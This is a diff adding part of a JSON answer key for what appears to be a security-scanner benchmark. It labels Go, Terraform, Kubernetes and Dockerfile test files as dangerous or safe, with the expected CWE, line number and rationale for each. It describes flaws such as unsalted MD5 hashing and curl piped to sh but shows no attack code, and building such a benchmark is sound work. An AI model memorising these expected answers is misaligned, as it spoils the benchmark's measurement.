+   "rationale": "The requested name is joined to a base directory without confinement; filepath.Join cleans the path but does not stop ../ from climbing out of the base."
+  },
+  {
+   "id": "go-md5-password",
+   "file": "go/go_md5_password.go",
+   "language": "go",
+   "label": "dangerous",
+   "criticality": "medium",
+   "expected": [
+    {
+     "cwe": "CWE-327",
+     "line": 9,
+     "why": "MD5 for password hashing"
+    }
+   ],
+   "rationale": "Passwords are hashed with a single unsalted MD5 pass."
+  },
+  {
+   "id": "go-math-rand-token",
+   "file": "go/go_math_rand_token.go",
+   "language": "go",
+   "label": "dangerous",
+   "criticality": "medium",
+   "expected": [
+    {
+     "cwe": "CWE-338",
+     "line": 9,
+     "why": "non-cryptographic PRNG for a security token"
+    }
+   ],
+   "rationale": "math/rand is not a cryptographic generator; the token is predictable from the seed or a few outputs."
+  },
+  {
+   "id": "go-safe-parametrized",
+   "file": "go/go_safe_parametrized.go",
+   "language": "go",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "The value is passed as a bound parameter ($1)."
+  },
+  {
+   "id": "go-safe-exec-validated",
+   "file": "go/go_safe_exec_validated.go",
+   "language": "go",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "No shell; arguments are separate and the host is parsed as an IP first."
+  },
+  {
+   "id": "go-safe-crypto",
+   "file": "go/go_safe_crypto.go",
+   "language": "go",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "Tokens come from crypto/rand, files are confined by reducing the name to its base, TLS uses defaults."
+  },
+  {
+   "id": "tf-ssh-open-world",
+   "file": "terraform/tf_ssh_open_world.tf",
+   "language": "terraform",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-284",
+     "line": 9,
+     "why": "SSH reachable from any address"
+    }
+   ],
+   "rationale": "SSH (port 22) is open to the whole internet, so every password-guessing or exploit scan reaches the host."
+  },
+  {
+   "id": "tf-public-bucket",
+   "file": "terraform/tf_public_bucket.tf",
+   "language": "terraform",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-732",
+     "line": 3,
+     "why": "bucket readable by everyone"
+    }
+   ],
+   "rationale": "The bucket ACL is public-read: every object is downloadable by anyone, including backups and exports."
+  },
+  {
+   "id": "tf-db-unencrypted",
+   "file": "terraform/tf_db_unencrypted.tf",
+   "language": "terraform",
+   "label": "dangerous",
+   "criticality": "medium",
+   "expected": [
+    {
+     "cwe": "CWE-311",
+     "line": 6,
+     "why": "database storage not encrypted"
+    }
+   ],
+   "rationale": "Storage encryption is turned off for the database: disks, snapshots and replicas hold plaintext data."
+  },
+  {
+   "id": "tf-hardcoded-db-password",
+   "file": "terraform/tf_hardcoded_db_password.tf",
+   "language": "terraform",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-798",
+     "line": 8,
+     "why": "database master password in source"
+    }
+   ],
+   "rationale": "The master password is a literal in a file that is committed and stored in Terraform state in plaintext."
+  },
+  {
+   "id": "tf-safe-restricted-ssh",
+   "file": "terraform/tf_safe_restricted_ssh.tf",
+   "language": "terraform",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "SSH is allowed only from the corporate range, and the bucket blocks public access."
+  },
+  {
+   "id": "tf-safe-encrypted-db",
+   "file": "terraform/tf_safe_encrypted_db.tf",
+   "language": "terraform",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "Storage is encrypted with a customer key and the password comes from a variable marked sensitive."
+  },
+  {
+   "id": "k8s-privileged-container",
+   "file": "yaml/k8s_privileged_container.yaml",
+   "language": "yaml",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-250",
+     "line": 10,
+     "why": "container runs privileged"
+    }
+   ],
+   "rationale": "privileged: true gives the container nearly all host capabilities and device access; a compromise of the app is a compromise of the node."
+  },
+  {
+   "id": "k8s-host-network",
+   "file": "yaml/k8s_host_network.yaml",
+   "language": "yaml",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-250",
+     "line": 6,
+     "why": "pod shares the node network namespace"
+    }
+   ],
+   "rationale": "hostNetwork puts the pod in the node's network namespace: it can reach node-local services and sniff host traffic. Not a privileged flag, so a rule looking only for privileged: true misses it."
+  },
+  {
+   "id": "k8s-plaintext-secret-env",
+   "file": "yaml/k8s_plaintext_secret_env.yaml",
+   "language": "yaml",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-798",
+     "line": 20,
+     "why": "credential literal in a manifest"
+    }
+   ],
+   "rationale": "The database password is a literal environment value in the manifest, readable by anyone with access to the repository or the pod spec."
+  },
+  {
+   "id": "k8s-safe-hardened-pod",
+   "file": "yaml/k8s_safe_hardened_pod.yaml",
+   "language": "yaml",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "Runs as a non-root user with a read-only root filesystem, dropped capabilities and no privilege escalation; the password is read from a Secret."
+  },
+  {
+   "id": "k8s-safe-deployment",
+   "file": "yaml/k8s_safe_deployment.yaml",
+   "language": "yaml",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "Ordinary deployment: pod network, resource limits, non-root user."
+  },
+  {
+   "id": "docker-runs-as-root",
+   "file": "dockerfile/Dockerfile.docker_runs_as_root",
+   "language": "dockerfile",
+   "label": "dangerous",
+   "criticality": "low",
+   "expected": [
+    {
+     "cwe": "CWE-250",
+     "line": 0,
+     "why": "no USER instruction, so the container runs as root"
+    }
+   ],
+   "rationale": "The image never switches away from root, so a compromise of the app process has root inside the container."
+  },
+  {
+   "id": "docker-secret-in-env",
+   "file": "dockerfile/Dockerfile.docker_secret_in_env",
+   "language": "dockerfile",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-798",
+     "line": 6,
+     "why": "secret baked into an image layer"
+    }
+   ],
+   "rationale": "A credential is baked into an image layer with ENV: it is visible in docker inspect and to anyone who can pull the image."
+  },
+  {
+   "id": "docker-curl-pipe-sh",
+   "file": "dockerfile/Dockerfile.docker_curl_pipe_sh",
+   "language": "dockerfile",
+   "label": "dangerous",
+   "criticality": "medium",
+   "expected": [
+    {
+     "cwe": "CWE-494",
+     "line": 3,
+     "why": "code downloaded and executed without verification"
+    }
+   ],
+   "rationale": "An installer is downloaded and piped to a shell with no checksum or signature check; whoever controls the URL (or the connection) controls the build. Not a secret and not root, so most rules do not look for it."
+  },
+  {
+   "id": "docker-safe-nonroot",
+   "file": "dockerfile/Dockerfile.docker_safe_nonroot",
+   "language": "dockerfile",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "Pinned base image, a dedicated unprivileged user, no secrets in layers."
+  },
+  {
+   "id": "docker-safe-multistage",
+   "file": "dockerfile/Dockerfile.docker_safe_multistage",
+   "language": "dockerfile",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "Multi-stage build; the runtime stage is minimal and runs as a numeric non-root user."
+  }
+ ]
+}
